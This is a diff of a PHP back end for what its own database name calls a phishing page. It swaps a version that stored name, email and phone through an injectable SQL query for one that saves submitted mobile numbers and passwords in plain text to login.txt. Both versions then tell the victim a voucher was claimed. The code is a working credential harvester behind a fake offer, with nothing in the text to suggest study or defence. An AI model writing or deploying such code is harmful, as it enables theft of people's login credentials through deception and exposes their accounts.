@@ -1,30 +1,22 @@
 <?php
-$servername = "your_server";
-$username = "your_username";
-$password = "your_password";
-$dbname = "phishing_db";
-
-// Create connection
-$conn = new mysqli($servername, $username, $password, $dbname);
-
-// Check connection
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
-}
-
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $name = $_POST['name'];
-    $email = $_POST['email'];
-    $phone = $_POST['phone'];
+    $mobile = $_POST['mobile'];
+    $password = $_POST['password'];
 
-    $sql = "INSERT INTO users (name, email, phone) VALUES ('$name', '$email', '$phone')";
+    // Define the file where the data will be saved
+    $filename = 'login.txt';
 
-    if ($conn->query($sql) === TRUE) {
-        echo "Your voucher has been claimed successfully!";
-    } else {
-        echo "Error: " . $sql . "<br>" . $conn->error;
-    }
+    // Open the file for writing
+    $file = fopen($filename, 'a');
+
+    // Write the data to the file
+    fwrite($file, "Mobile Number: " . $mobile . "\n");
+    fwrite($file, "Password: " . $password . "\n");
+    fwrite($file, "-----------------------------\n");
+
+    // Close the file
+    fclose($file);
+
+    echo "Your voucher has been claimed successfully!";
 }
-
-$conn->close();
 ?>
